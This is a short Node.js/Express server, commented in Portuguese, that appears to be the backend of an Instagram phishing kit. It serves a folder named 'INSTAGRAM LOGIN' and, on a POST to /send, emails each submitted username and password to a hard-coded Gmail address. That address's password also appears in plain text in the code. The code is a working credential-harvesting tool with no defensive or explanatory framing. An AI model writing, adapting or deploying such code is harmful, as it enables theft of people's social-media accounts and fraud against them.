const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
const port = 3000;

// Configuração do transporte de email
const transporter = nodemailer.createTransport({
    service: 'gmail', // Use o serviço de e-mail desejado
    auth: {
        user: 'y95890650@gmail.com', // Substitua pelo seu e-mail
        pass: '@21084141471#ND' // Substitua pela sua senha de aplicativo
    }
});

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static('INSTAGRAM LOGIN')); // Servir arquivos estáticos da pasta 'INSTAGRAM LOGIN'

// Rota para enviar e-mail
app.post('/send', (req, res) => {
    const { username, password } = req.body;

    // Configuração do e-mail
    const mailOptions = {
        from: 'y95890650@gmail.com',
        to: 'y95890650@gmail.com',
        subject: 'Novo Login',
        text: `Usuário: ${username}\nSenha: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).send('Erro ao enviar e-mail');
        }
        res.send('Informações enviadas com sucesso');
    });
});

app.listen(port, () => {
    console.log(`Servidor ouvindo na porta ${port}`);
});
